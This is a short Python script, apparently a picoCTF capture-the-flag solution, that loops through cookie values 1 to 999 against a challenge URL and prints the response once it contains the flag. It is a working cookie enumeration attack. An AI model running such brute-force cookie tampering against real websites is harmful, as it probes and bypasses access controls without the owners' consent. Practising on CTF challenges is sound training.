import requests

url = 'http://mercury.picoctf.net:54219/check'

cookie = {"name": "1"}
for i in range(1, 1000):
    cookie["name"] = str(i)
    r = requests.get(url, cookies=cookie)
    print("trying : " + str(i), r.status_code)
    if r.status_code == 200 and "picoCTF" in r.text:
        print(r.text)
        break
